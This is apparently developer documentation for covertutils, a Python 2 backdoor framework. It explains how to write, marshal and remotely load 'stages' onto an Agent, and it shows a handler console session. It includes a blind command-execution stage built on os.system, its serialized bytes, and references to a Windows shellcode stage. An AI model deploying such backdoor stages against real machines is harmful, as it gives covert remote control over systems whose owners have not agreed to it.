.. _stage_api_page:

Creating Custom Stages and Modules
==================================


Have you heard of the `invoke` command in `meterpreter`?
The ``covertutils`` package provides a similar functionality, and a documented API for making `load`-able modules and stages.

The language used for the API is `Python2.7` without any dependencies. A solid `CPython2` installation will suffice. Later the better.


Every module loaded in an `Agent` will use a separate `stream` to talk back to the Handler.
The Handler can then assign a SubShell like the :class:`covertutils.shells.subshell.SimpleSubShell` to that `stream` to be able to communicate using that `stream`.



Making the `Agent`'s functions
------------------------------

The `Agent` (equipped with :class:`covertutils.handler.FunctionDictHandler` and derivatives) automatically runs a function when a `stream` is *initialized* (once) and every time a *message arrives* to that `stream`. These 2 functions are always named ``init()`` and ``work()``. Examples can be found in all modules under :mod:`covertutils.payloads` subpackage.

The ``init()`` and ``work()`` functions are the only pieces of code that have to be sent to the `Agent` and they define the `stage` of the custom module.

Function prototypes and definitions:

.. literalinclude:: ../covertutils/payloads/generic/example.py

Available @ : :mod:`covertutils.payloads.generic.example`


It is possible for the ``init()`` function to be omitted. In this case a dummy function like the following is assumed:

.. code:: python

	def init(storage) :
	 	return True


If imports have to be used in the ``work()`` and ``init()``, they have to be imported from inside the function bodies. The module where the functions are located is never loaded to the remote `Agent`. An example of that is the blind execution shell below.

.. code:: python

	def work(storage, message) :
		import os
		os.system(message)
		return "Command Executed!"








Packing the `stage` for transferring
------------------------------------

As code is not always handy to be sent remotely, the object `marshaling` is supported. The `marshal` module is used from Python builtins for that purpose.

.. code:: python

	>>> def work(storage, message) :
	...   import os
	...   os.system(message)
	...   return "Command Executed!"
	...
	>>> import marshal
	>>> marshal.dumps(work.func_code)
	'c\x02\x00\x00\x00\x03\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x1d\x00\x00\x00d\x01\x00d\x00\x00l\x00\x00}\x02\x00|\x02\x00j\x01\x00|\x01\x00\x83\x01\x00\x01d\x02\x00S(\x03\x00\x00\x00Ni\xff\xff\xff\xffs\x11\x00\x00\x00Command Executed!(\x02\x00\x00\x00t\x02\x00\x00\x00ost\x06\x00\x00\x00system(\x03\x00\x00\x00t\x07\x00\x00\x00storaget\x07\x00\x00\x00messageR\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x07\x00\x00\x00<stdin>t\x04\x00\x00\x00work\x01\x00\x00\x00s\x06\x00\x00\x00\x00\x01\x0c\x01\r\x01'


Strings created this way can be decoded back to the original function objects!


So packing `stage functions` has been automated by the :mod:`covertutils.payloads` module and the :func:`covertutils.payloads.import_stage_from_module` function.
This function returns a `dict` consisting of several serializations of the stage's functions.

.. code:: python

	>>> from covertutils.payloads import import_stage_from_module
	>>>	from pprint import pprint
	>>> stage_obj = import_stage_from_module('covertutils.payloads.generic.example')
	>>> pprint (stage_obj)
	{'dill': '\x80\x02}q\x00(U\x04initq\x01cdill.dill\n_load_type\nq\x02U\x08CodeTypeq\x03\x85q\x04Rq\x05(K\x01K\x01K\x01KCU\td\x01\x00GHt\x00\x00Sq\x06TW\x01\x00\x00\n:param dict storage: The storage object is the only persistent object between runs of both `init()` and `work()`. It is treated as a "Local Storage" for the `stage`.\n:return: This function must **always** return True if the initialization is succesfull. If `False` values are returned the `stage` doesn\'t start and `work()` is never called.\n\tq\x07U\x13Initializing stage!q\x08\x86q\tU\x04Trueq\n\x85q\x0bU\x07storageq\x0c\x85q\rU\'covertutils/payloads/generic/example.pyq\x0eh\x01K\x04U\x04\x00\x05\x05\x01q\x0f))tq\x10Rq\x11U\x04workq\x12h\x05(K\x02K\x02K\x04KCU\x1fd\x01\x00|\x01\x00\x16GHd\x02\x00GH|\x01\x00d\x03\x00d\x03\x00d\x04\x00\x85\x03\x00\x19Sq\x13(Ti\x01\x00\x00\n:param dict storage: The storage object is the only persistent object between runs of both `init()` and `work()`. It is treated as a "Local Storage" for the `stage`.\n:param str message: The data sent from the `Handler` to that `stage`.\n:rtype: str\n:return: The response to message that arrived. This exact response will reach the `Handler` in the other side.\n\tq\x14U!Running for handlers message \'%s\'q\x15U Returning the message in reverseq\x16NJ\xff\xff\xff\xfftq\x17)h\x0cU\x07messageq\x18\x86q\x19h\x0eh\x12K\rU\x06\x00\x07\t\x02\x05\x01q\x1a))tq\x1bRq\x1cu.',
	 'marshal': '{t\x04\x00\x00\x00initc\x01\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00C\x00\x00\x00s\t\x00\x00\x00d\x01\x00GHt\x00\x00S(\x02\x00\x00\x00sW\x01\x00\x00\n:param dict storage: The storage object is the only persistent object between runs of both `init()` and `work()`. It is treated as a "Local Storage" for the `stage`.\n:return: This function must **always** return True if the initialization is succesfull. If `False` values are returned the `stage` doesn\'t start and `work()` is never called.\n\ts\x13\x00\x00\x00Initializing stage!(\x01\x00\x00\x00t\x04\x00\x00\x00True(\x01\x00\x00\x00t\x07\x00\x00\x00storage(\x00\x00\x00\x00(\x00\x00\x00\x00s\'\x00\x00\x00covertutils/payloads/generic/example.pyR\x00\x00\x00\x00\x04\x00\x00\x00s\x04\x00\x00\x00\x00\x05\x05\x01t\x04\x00\x00\x00workc\x02\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00C\x00\x00\x00s\x1f\x00\x00\x00d\x01\x00|\x01\x00\x16GHd\x02\x00GH|\x01\x00d\x03\x00d\x03\x00d\x04\x00\x85\x03\x00\x19S(\x05\x00\x00\x00si\x01\x00\x00\n:param dict storage: The storage object is the only persistent object between runs of both `init()` and `work()`. It is treated as a "Local Storage" for the `stage`.\n:param str message: The data sent from the `Handler` to that `stage`.\n:rtype: str\n:return: The response to message that arrived. This exact response will reach the `Handler` in the other side.\n\ts!\x00\x00\x00Running for handlers message \'%s\'s \x00\x00\x00Returning the message in reverseNi\xff\xff\xff\xff(\x00\x00\x00\x00(\x02\x00\x00\x00R\x02\x00\x00\x00t\x07\x00\x00\x00message(\x00\x00\x00\x00(\x00\x00\x00\x00s\'\x00\x00\x00covertutils/payloads/generic/example.pyR\x03\x00\x00\x00\r\x00\x00\x00s\x06\x00\x00\x00\x00\x07\t\x02\x05\x010',
	 'object': {'init': <function init at 0x7facfe198410>,
	            'work': <function work at 0x7facfe198500>},
	 'python': {'init': <code object init at 0x7facffdfa330, file "covertutils/payloads/generic/example.py", line 4>,
	            'work': <code object work at 0x7facfe1a0030, file "covertutils/payloads/generic/example.py", line 13>}}
	>>>


It is noticeable that :func:`import_stage_from_module` automatically searches for the dill_ serialization package. If it is available the 'dilled' key is inserted into the returned `dict` object.


.. _dill: https://pypi.python.org/pypi/dill

Typically, the `Agent` will automatically load the ``stage_obj['marshal']`` objects (automatically falling back to builtin solutions).


*The function comments are also packed from `marshal`. Be sure to get rid of them to reduce the stage size! pyminifier_ can be used for such stuff `(God bless its author - I love that project)` !

.. _pyminifier: http://pythonhosted.org/pyminifier/











Breakin' on through to the Other Side
-------------------------------------

When the `stage` is ready, `marshaled` and all, the :func:`covertutils.handlers.StageableHandler.createStageMessage` has to be used to pack it as a message. The other side must also be equipped with a :class:`covertutils.handlers.StageableHandler` to be able to dynamically load the stage to a separate thread, connect it to the `stream` and do the business. This typically gets automated by the :class:`covertutils.shells.ExtendableShell` to the point of ``!stage fload /tmp/stage_file.py`` and ``!stage mload covertutils.payloads.windows.shellcode`` (this `stage` actually exists @ :mod:`covertutils.payloads.windows.shellcode`).











Can I have a REPL for this API pretty please?
---------------------------------------------

An already implemented stage is the :mod:`covertutils.payloads.generic.pythonapi`. This `stage` gets perfectly paired with the :class:`covertutils.shells.subshells.PythonAPISubShell` which features indentation prompts (``...`` instead of ``>>>``), automatic python source file loading (``@pyload`` command), spell checking **before transmitting erroneous code** and dynamic access to the API (commands get ``exec'd`` in a ``work()`` function with ``locals()``) and the `storage` dict.

From this `stage` one can dynamically change, all `Agent's` handler fields and methods, like the ``send()`` and ``recv()`` functions, and generally all ``covertutils`` Handler Class internals (all the way down to `Orchestrators`, `Chunkers` and encryption keys)

Example of the PythonAPI `stage` can be found at :ref:`pythonapi-stage`.

So, if the `pythonapi` stage can do all those, any custom `stage` can. Tinkering with the internals at run time is not only possible but commonly used. The :mod:`covertutils.payloads.generic.control` stage uses such techniques to reset keys and change access passwords, all at runtime.
This is also the way that the :class:`covertutils.handlers.StageableHandler` loads `stages`. By using a pre-loaded stage to resolve stage messages. The stages ``work()`` function can be found at :func:`covertutils.handlers.stageable.stager_worker`

This is the nature of all ``covertutils`` backdoors - reprogrammable at runtime. This is the nature of Python and interpreted languages...




What about a Custom `SubShell` too?
-----------------------------------

`Custom SubShells` can also be created and paired with custom `Stages`. They are useful when you need to modify user input before sending to the `stage's` ``work()`` function, or for customizing prompts, etc.

Creating one will require subclassing the :class:`covertutils.shells.subshells.SimpleSubShell` class. The ``SimpleSubShell`` class itself is a subclass of :class:`cmd.Cmd` which is a Python built-in (docs @ https://docs.python.org/2/library/cmd.html).

The ``example`` `stage`, referenced above, is paired with the :class:`covertutils.shells.subshells.ExampleSubShell`.
In order for a `SubShell` to be paired with a `stage`, the ``shell`` variable has to be defined as the SubShell's **class** (not object) in the `stage's` module.

The `covertutils`' :class:`ExtendedShell`, will automatically add the `SubShell` class specified in the `stage's` module to the `stream` when the ``!stage mload`` or ``!stage fload`` commands are used.

.. code:: bash

	(127.0.0.1:50960)>
	(127.0.0.1:50960)> !stage mload covertutils.payloads.generic.example
	(127.0.0.1:50960)> example

	(127.0.0.1:50960)>
	Available Streams:
		[ 0] - control
		[ 1] - python
		[ 2] - os-shell
		[ 3] - example
		[ 4] - stage
		[99] - EXIT
	Select stream: 3

	This is an Example Shell. It has a custom prompt, and reverses all input before sending to the stage.

	 ExampleSubShell Stream:[example]==> hello
	Sending 'olleh' to the 'example' agent!
	 hello

	 ExampleSubShell Stream:[example]==>
	(127.0.0.1:50960)>
	Available Streams:
		[ 0] - control
		[ 1] - python
		[ 2] - os-shell
		[ 3] - example
		[ 4] - stage
		[99] - EXIT
	Select stream: 99



The :class:`ExampleSubShell`'s code is the following:

.. literalinclude:: ../covertutils/shells/subshells/examplesubshell.py
